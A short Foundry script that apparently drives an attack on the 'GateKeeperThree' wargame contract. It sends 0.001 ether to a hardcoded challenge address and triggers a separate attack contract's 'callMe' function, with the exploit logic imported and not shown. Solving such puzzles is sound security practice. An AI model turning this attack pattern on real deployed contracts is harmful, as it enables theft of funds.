// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {IGateKeeperThree, GateKeeperThreeAttack} from "../src/GateKeeperThree.sol";

interface IGateKeeperThreeAttack {
    
    function callMe() external;
}

contract GateKeeperThree is Script {
    IGateKeeperThree public gateKeeperThree = IGateKeeperThree(0x9Ea35f4bAD915f7FC4f553B0e9e4541c5c0697Fd);

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("pvt_key");
        vm.startBroadcast(deployerPrivateKey);
        
        IGateKeeperThreeAttack yo = IGateKeeperThreeAttack(0x5B25D5286d5537308E9dfE517d6a82f4C5bdFA05);
        
        (bool success, ) = address(gateKeeperThree).call{value: 0.001 ether}("");
        require(success, "not paid ether");
        
        yo.callMe();
        vm.stopBroadcast();
        
    }
}